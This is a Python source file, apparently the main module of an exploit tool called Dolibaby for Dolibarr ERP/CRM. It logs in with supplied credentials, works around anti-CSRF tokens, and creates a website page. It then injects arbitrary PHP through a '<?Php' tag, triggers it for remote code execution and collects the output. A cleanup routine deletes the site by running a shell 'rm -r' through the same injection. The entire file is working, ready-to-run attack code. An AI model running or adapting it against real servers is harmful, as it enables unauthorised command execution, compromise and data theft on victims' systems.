from typing import Any, TextIO, TypeGuard, Union, Callable
from dataclasses import dataclass
from http.cookies import SimpleCookie
import uuid
import time

import requests
import requests.auth
from furl import furl
from bs4 import BeautifulSoup, Tag
from tenacity import RetryCallState, retry, stop_after_attempt, wait_fixed

from .exceptions import (
    CleanupScriptUploadError,
    DolibabyException,
    PayloadTriggerError,
    CleanupTriggerError,
    PayloadUploadError,
    SiteWasDeletedError,
    TriggerException,
    UploadException,
)
from .logging import log

USER_AGENT = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
SESSION_ID_COOKIE = "DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92"


def raise_error(retry_state: RetryCallState) -> None:
    if retry_state.outcome is not None:
        exception = retry_state.outcome.exception()
        if exception is not None:
            raise exception


@dataclass
class ExploitResult:
    site_name: str
    cleaned_up: bool
    output: str | None


class Exploit:
    target_url: furl
    username: str
    password: str
    site_name: str
    page_name: str
    page_title: str
    proxy: furl | None
    output: TextIO | None

    session: requests.Session
    pageid: str

    def __init__(
        self,
        target_url: furl,
        username: str,
        password: str,
        site_name: str | None = None,
        page_name: str | None = None,
        page_title: str | None = None,
        proxy: furl | None = None,
        output: TextIO | None = None,
    ):
        self.target_url = target_url
        self.username = username
        self.password = password

        self.new_site_name()
        self.new_page_name()

        self.session = requests.Session()
        self.proxy = proxy
        self.output = output

    def new_site_name(self, site_name: str | None = None):
        self.site_name = site_name or uuid.uuid4().hex[:12]

    def new_page_name(
        self, page_name: str | None = None, page_title: str | None = None
    ):
        self.page_name = page_name or uuid.uuid4().hex[:12]
        self.page_title = page_title or self.page_name

    def run(self, payload: str) -> ExploitResult:
        log.info("Starting the exploit.")
        self.session.auth = DolibarrAuth(
            self.target_url, self.username, self.password, proxy=self.proxy
        )
        if self.proxy and self.proxy.scheme in ("http", "https"):
            self.session.proxies = {self.proxy.scheme: self.proxy.url}

        # Create the site.
        self.create_site()

        # Create the page within the site.
        self.create_page()

        payload_output: str | None = None
        try:
            # Upload the PHP payload.
            self.edit_page(
                f"<?Php {payload} ?>",
                lambda response: PayloadUploadError(payload, response),
            )
            log.info(
                "Edited the new page's content to include your payload.",
                payload=payload,
            )

            log.info(
                "Triggering the payload. This request will hang until the payload finishes running on the target machine."
            )
            time.sleep(1)
            # Trigger the payload and log any results.
            payload_output = self.trigger_payload(
                lambda response: PayloadTriggerError(response)
            )
            if payload_output is not None:
                log.info("Your payload finished, and it had some output.")
                if self.output is not None:
                    self.output.write(payload_output + "\n")
            else:
                log.warn("Your payload finished, but no output was received.")
        except PayloadUploadError as error:
            log.warn(error)
        except PayloadTriggerError as error:
            log.warn(error)
        finally:
            # Wait a second for any previous actions to finish up before deleting the site.
            time.sleep(1)
            cleaned_up = self.cleanup()

            self.session.close()
            return ExploitResult(self.site_name, cleaned_up, payload_output)

    def create_site(self) -> None:
        """Creates a new site with the current site_name. Logs a warning but does not raise an error if a site with the same name already exists."""
        # Try to create the site.
        response = self.session.post(
            self.target_url.copy().join("./website/index.php").url,
            headers={
                "User-Agent": USER_AGENT,
                "Accept-Encoding": "gzip, deflate, br",
                "Accept": "*/*",
            },
            files={
                "token": (None, "{{token}}"),
                "backtopage": (None, ""),
                "dol_openinpopup": (None, ""),
                "action": (None, "addsite"),
                "website": (None, "-1"),
                "WEBSITE_REF": (None, self.site_name),
                "WEBSITE_LANG": (None, "en"),
                "WEBSITE_OTHERLANG": (None, ""),
                "WEBSITE_DESCRIPTION": (None, ""),
                "virtualhost": (None, f"http://{self.site_name}.localhost"),
                "addcontainer": (None, "Create"),
            },
            allow_redirects=False,
        )

        if (
            response.status_code == 200
            and "text/html" in response.headers.get("Content-Type", "")
            and "This label already exists" in response.text
        ):
            # A site with this name already exists.
            # TODO: provide a mechanism for the exploit to stop when there is already a site with that name.
            log.warn("This site already exists.", site_name=self.site_name)
            return

        if response.status_code != 302:
            # Unexpected error (e.g. 404).
            raise DolibabyException(
                "Unable to create a site on the target. Make sure the site name is unique.",
                self.site_name,
                response,
            )

        # Successfully created the site on the target.
        log.info("New site created on target!", site_name=self.site_name)

    def create_page(self):
        # Try to create the page.
        response = self.session.post(
            self.target_url.copy().join("./website/index.php").url,
            headers={
                "User-Agent": USER_AGENT,
                "Accept-Encoding": "gzip, deflate, br",
                "Accept": "*/*",
            },
            files={
                "token": (None, "{{token}}"),
                "backtopage": (None, ""),
                "dol_openinpopup": (None, ""),
                "action": (None, "addcontainer"),
                "website": self.site_name,
                "pageidbis": (None, "-1"),
                "pageid": (None, ""),
                "radiocreatefrom": (None, "checkboxcreatemanually"),
                "WEBSITE_TYPE_CONTAINER": (None, "page"),
                "sample": (None, "empty"),
                "WEBSITE_TITLE": (None, self.page_title),
                "WEBSITE_PAGENAME": (None, self.page_name),
                "WEBSITE_ALIASALT": (None, ""),
                "WEBSITE_DESCRIPTION": (None, ""),
                "WEBSITE_IMAGE": (None, ""),
                "WEBSITE_KEYWORDS": (None, ""),
                "WEBSITE_LANG": (None, "0"),
                "WEBSITE_AUTHORALIAS": (None, ""),
                "datecreation": (None, "07/08/2024"),
                "datecreationday": (None, "08"),
                "datecreationmonth": (None, "07"),
                "datecreationyear": (None, "2024"),
                "datecreationhour": (None, "12"),
                "datecreationmin": (None, "09"),
                "datecreationsec": (None, "55"),
                "htmlheader_x": (None, ""),
                "htmlheader_y": (None, ""),
                "htmlheader": (None, ""),
                "addcontainer": (None, "Create"),
                "externalurl": (None, ""),
                "grabimages": (None, "1"),
                "grabimagesinto": (None, "root"),
            },
            allow_redirects=False,
        )

        if (
            response.status_code == 200
            and "text/html" in response.headers.get("Content-Type", "")
            and "Reference already exists." in response.text
        ):
            # A page with this name already exists.
            # TODO: provide a mechanism for the exploit to stop when there is already a page with that name.
            log.warn("This page already exists.", page_name=self.page_name)
            return

        if response.status_code != 200 or "Website added" not in response.text:
            # Unexpected error (e.g. 404)
            raise DolibabyException(
                "Unable to create a page on the new site.",
                self.site_name,
                self.page_name,
                response,
            )

        # Successfully created the page.
        log.info("New page created for the site.", page_name=self.page_name)

        # Extracting the page's ID number because it is necessary for editing the page.
        soup = BeautifulSoup(response.text, "html.parser")
        pageid_select = soup.find(id="pageid")
        if not isinstance(pageid_select, Tag):
            # Couldn't find the <select> for the page ID.
            raise DolibabyException(
                "Unable to find the page ID after creating the site."
            )

        selected_option = pageid_select.find(attrs={"selected": True})
        if (
            not isinstance(selected_option, Tag)
            or selected_option.attrs.get("value") is None
        ):
            # Either couldn't find the selected <option> or the <option> has no value attribute.
            raise DolibabyException(
                "Unable to find the page ID after creating the site."
            )

        # Successfully got the page ID.
        self.pageid = selected_option.attrs["value"]
        log.info("Found the ID of the page.", id=self.pageid)

    def cleanup(self) -> bool:
        """Attempts to delete the current site from the target."""
        log.info("Starting the cleanup process.")
        # Try to upload the cleanup payload.
        try:
            self.edit_page(
                f"<?Php system(\"rm -r $(pwd | sed -e 's:/htdocs/public/website::')/documents/website/{self.site_name}; echo $?\"); ?>",
                lambda response: CleanupScriptUploadError(self.site_name, response),
            )
            log.info(
                "Edited the page's content to include a script to clean up the site.",
                site_name=self.site_name,
            )
        except SiteWasDeletedError:
            # The site was already deleted, so cleanup is successful.
            log.warn("Cleanup was interrupted because the site was already deleted.")
            return True

        log.info("Triggering the cleanup script...")
        time.sleep(1)  # Wait a second for the edit to finish taking place.
        # Try to trigger the cleanup payload.
        try:
            cleanup_output = self.trigger_payload(
                lambda response: CleanupTriggerError(response)
            )
        except CleanupTriggerError as error:
            log.warn(error)
            return False

        if cleanup_output is None:
            # No exit code was received.
            log.warn("Cleanup for the exploit did not return any output.")
            return False

        # Try to convert the exit code to a number.
        try:
            cleanup_exit_code = int(cleanup_output)
        except ValueError:  # invalid exit code
            log.warn(
                f"Cleanup for the exploit returned an invalid exit code: {cleanup_output}"
            )
            return False

        if cleanup_exit_code != 0:
            # Cleanup failed with a non-zero exit code.
            log.warn(
                "Cleanup was seemingly not successful.",
                exit_code=cleanup_exit_code,
            )
            return False

        # The site was successfully deleted.
        log.info("Cleanup successful!")
        return True

    def edit_page(
        self,
        payload: str,
        fail_exception: UploadException
        | Callable[[requests.Response], UploadException],
    ) -> None:
        """Attempts to edit the current page to include the payload."""
        # Upload the payload to the page we created.
        response = self.session.post(
            self.target_url.copy().join("./website/index.php").url,
            headers={
                "User-Agent": USER_AGENT,
                "Accept-Encoding": "gzip, deflate, br",
                "Accept": "*/*",
            },
            files={
                "token": (None, "{{token}}"),
                "backtopage": (None, ""),
                "dol_openinpopup": (None, ""),
                "action": (None, "updatesource"),
                "website": (None, self.site_name),
                "pageid": (None, self.pageid),
                "update": (None, "Save"),
                "PAGE_CONTENT_x": (None, "0"),
                "PAGE_CONTENT_y": (None, "0"),
                "PAGE_CONTENT": (
                    None,
                    payload,
                ),
            },
            allow_redirects=False,
        )

        if response.status_code == 302:
            # Redirect occurs when the request is successful.
            return

        if (
            response.status_code == 200
            and "text/html" in response.headers.get("Content-Type", "")
            and "No website has been created yet." in response.text
        ):
            # The website was likely deleted by someone else.
            raise SiteWasDeletedError()

        # Unexpected error (e.g. 404).
        raise (
            fail_exception
            if isinstance(fail_exception, UploadException)
            else fail_exception(response)
        )

    @retry(
        stop=stop_after_attempt(3), wait=wait_fixed(1), retry_error_callback=raise_error
    )
    def trigger_payload(
        self,
        exception: TriggerException | Callable[[requests.Response], TriggerException],
    ) -> str | None:
        """Attempts to make a call to the current page triggering the payload."""
        # Request the page we edited to trigger the payload.
        response = self.session.get(
            self.target_url.copy()
            .join(
                f"/public/website/index.php?website={self.site_name}&pageref={self.page_name}"
            )
            .url,
            headers={
                "User-Agent": USER_AGENT,
                "Accept-Encoding": "gzip, deflate, br",
                "Accept": "text/html",
            },
        )

        if response.status_code != 200:
            # Unexpected error (e.g. 404).
            raise (
                exception
                if isinstance(exception, TriggerException)
                else exception(response)
            )

        # Extract the output from the payload.
        soup = BeautifulSoup(response.text, "html.parser")
        if soup.body is None:
            return None
        text = soup.body.text.strip()
        return text if len(text) > 0 else None


class DolibarrAuthState:
    @dataclass
    class Unauthenticated:
        pass

    @dataclass
    class Authenticated:
        token: str
        session_id: str

    @dataclass
    class LoginEvent:
        token: str
        session_id: str

    @dataclass
    class LogoutEvent:
        pass

    type State = Union[Unauthenticated, Authenticated]
    type Event = Union[LoginEvent, LogoutEvent]
    state: State = Unauthenticated()

    def is_authenticated(self, state: State) -> TypeGuard[Authenticated]:
        return isinstance(state, DolibarrAuthState.Authenticated)

    def dispatch(self, event: Event):
        if not self.is_authenticated(self.state) and isinstance(
            event, DolibarrAuthState.LoginEvent
        ):
            self.state = DolibarrAuthState.Authenticated(
                token=event.token, session_id=event.session_id
            )
            log.info(
                "Login successful.",
                token=event.token,
                session_id=event.session_id,
            )
        elif self.is_authenticated(self.state) and isinstance(
            event, DolibarrAuthState.LogoutEvent
        ):
            self.state = DolibarrAuthState.Unauthenticated()
            log.info("You may have been logged out.")
        else:
            raise DolibabyException(f"Invalid event {event} for state {self.state}.")


class DolibarrAuth(requests.auth.AuthBase, DolibarrAuthState):
    """A `requests` custom auth mechanism that logs into Dolibarr ERP/CRM when served the login page, adds the session ID to the `Cookie` header, and replaces any instances of "{{token}}" in the body."""

    base_url: furl
    username: str
    password: str
    proxy: furl | None

    def __init__(
        self, base_url: furl, username: str, password: str, proxy: furl | None = None
    ):
        self.base_url = base_url
        self.username = username
        self.password = password
        self.proxy = proxy
        self.login()

    def __call__(self, request: requests.PreparedRequest) -> requests.PreparedRequest:
        if self.is_authenticated(self.state):
            self.inject_authorization(request)
            request.register_hook("response", self.handle_loggedout)
        return request

    def handle_loggedout(
        self, response: requests.Response, **kwargs: Any
    ) -> requests.Response:
        """Check a response to see if it is a login page or has an unauthenticated/unauthorized HTTP status code. If so, log back in and re-make the request."""
        if (
            self.is_login_page(response)
            or response.status_code == 403
            or response.status_code == 401
        ):
            self.dispatch(DolibarrAuthState.LogoutEvent())

            # Consume content and release original connection to allow our new request to reuse the same one.
            response.content
            response.close()

            # Login so we can remake the request with authorization.
            self.login()
            request = response.request.copy()
            self.inject_authorization(request)

            # Redo the request and return the new response.
            new_response = response.connection.send(request, **kwargs)
            new_response.history.append(response)
            new_response.request = request
            return new_response
        else:
            return response

    def is_login_page(self, response: requests.Response) -> bool:
        if response.status_code != 200 or "text/html" not in response.headers.get(
            "Content-Type", ""
        ):
            return False

        title = BeautifulSoup(response.text, "html.parser").find("title")
        if not isinstance(title, Tag):
            return False

        return "Login" in title.get_text(strip=True)

    def inject_authorization(self, request: requests.PreparedRequest) -> None:
        """Updates the provided request with the anti-CSRF token and the session ID."""
        assert isinstance(self.state, DolibarrAuthState.Authenticated)

        if "Cookie" not in request.headers:
            request.headers["Cookie"] = ""
        cookies = SimpleCookie(request.headers["Cookie"])
        cookies[SESSION_ID_COOKIE] = self.state.session_id
        request.headers["Cookie"] = "; ".join(
            map(lambda morsel: f"{morsel.key}={morsel.value}", cookies.values())
        )

        if isinstance(request.body, str):
            request.body = request.body.replace("{{token}}", self.state.token)
        elif isinstance(request.body, bytes):
            request.body = request.body.replace(b"{{token}}", self.state.token.encode())

        if "Referer" in request.headers:
            request.headers["Referer"] = request.headers["Referer"].replace(
                "%7B%7Btoken%7D%7D", self.state.token
            )

    def login(self) -> None:
        """Logs into the target site and retrieves the anti-CSRF token and session ID."""
        # Get the anti-CSRF token and the session ID.
        session = requests.Session()
        if self.proxy and self.proxy.scheme in ("http", "https"):
            session.proxies = {self.proxy.scheme: self.proxy.url}

        response = session.get(
            self.base_url.copy().join("./index.php").url,
            headers={
                "User-Agent": USER_AGENT,
                "Accept-Encoding": "gzip, deflate, br",
                "Accept": "text/html",
            },
        )
        if response.status_code != 200:
            raise DolibabyException(
                f"Failed to retrieve the target site. Received status code {response.status_code}.",
                response,
            )
        token = self.extract_anticsrf_token(response)
        session_id = self.extract_session_id(response)

        # Login and retrieve authenticated anti-CSRF token.
        response = session.post(
            self.base_url.copy().join("./index.php?mainmenu=home").url,
            headers={
                "User-Agent": USER_AGENT,
                "Accept-Encoding": "gzip, deflate, br",
                "Accept": "text/html",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": f"{SESSION_ID_COOKIE}={session_id}",
            },
            data={
                "token": token,
                "actionlogin": "login",
                "loginfunction": "loginfunction",
                "backtopage": "",
                "tz": "-5",
                "tz_string": "America/New_York",
                "dst_observed": "1",
                "dst_first": "2024-03-10T01:59:00Z",
                "dst_second": "2024-11-3T01:59:00Z",
                "screenwidth": "1050",
                "screenheight": "965",
                "dol_hide_topmenu": "",
                "dol_hide_leftmenu": "",
                "dol_optimize_smallscreen": "",
                "dol_no_mouse_hover": "",
                "dol_use_jmobile": "",
                "username": self.username,
                "password": self.password,
            },
            allow_redirects=True,
        )
        if self.is_login_page(response):
            raise DolibabyException(
                f"Login with credentials user={self.username} pass={self.password} failed.",
                response,
            )
        token = self.extract_anticsrf_token(response)
        self.dispatch(DolibarrAuthState.LoginEvent(token, session_id))

    def extract_anticsrf_token(self, response: requests.Response) -> str:
        """Extracts the anti-CSRF token from a response from the response."""
        soup = BeautifulSoup(response.text, "html.parser")
        meta = soup.find("meta", attrs={"name": "anti-csrf-newtoken"})
        if not isinstance(meta, Tag):
            raise DolibabyException(
                "Anti-CSRF token not found. Please check your URL.", soup.text, response
            )

        token = meta.attrs.get("content")
        if token is None or len(token) == 0:
            raise DolibabyException(
                "Anti-CSRF meta tag was found but was empty.", soup.text, response
            )

        return token

    def extract_session_id(self, response: requests.Response) -> str:
        """Extracts the DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92 cookie from the response."""
        if SESSION_ID_COOKIE not in response.cookies:
            raise DolibabyException(
                "Unable to get session ID (DOLSESSID) from the target. Please double-check the target URL."
            )
        return response.cookies[SESSION_ID_COOKIE]
